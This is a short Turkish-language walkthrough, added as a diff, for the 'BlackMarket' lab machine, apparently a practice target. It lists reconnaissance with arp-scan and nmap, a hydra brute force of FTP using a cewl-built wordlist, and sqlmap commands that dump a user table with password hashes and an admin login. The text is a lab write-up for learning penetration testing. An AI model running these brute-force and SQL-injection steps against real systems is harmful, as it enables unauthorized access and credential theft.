@@ -1,0 +1,19 @@
+BLACKMARKET MAKİNE ÇÖZÜMÜ
+1 - arp-scan --localnet ile IP adresi 192.168.2.113 bulundu.
+2 - nmap -A 192.168.2.113
+3 - 
+4 - view-source:http://192.168.2.113/ -> base64 -d -> "CIA - Operation Treadstone"
+5 - cewl https://bourne.fandom.com/wiki/Operation_Treadstone -w cewl_blackmarket.txt
+6 - hydra -L cewl_blackmarket.txt -P cewl_blackmarket.txt ftp://192.168.2.113, nicky : CIA
+7 - ftp 192.168.2.113
+8 - http://192.168.2.113/vworkshop/
+9 - sqlmap -u "http://192.168.2.113/vworkshop/sparepartsstoremore.php?sparepartid=1" --dbs
+10 - sqlmap -u "http://192.168.2.113/vworkshop/sparepartsstoremore.php?sparepartid=1" -D BlackMarket --tables
+11 - sqlmap -u "http://192.168.2.113/vworkshop/sparepartsstoremore.php?sparepartid=1" -D BlackMarket -T user --dump
+cf18233438b9e88937ea0176f1311885 (BigBossCIA)| admin    |
+0d8d5cd06832b29560745fe4e1b941cf (user)      | user     |
+99b0e8da24e29e4ccb5d7d76e677c2ac (supplier)  | supplier |
+8267a2e06e312aee91324e2fe8ef1fd              | jbourne  |
+cbb8d2a0335c793532f9ad516987a41c             | bladen   |
+12 - http://192.168.2.113/login.php -> admin:BigBossCIA
+13 - http://192.168.2.113/squirrelmail/
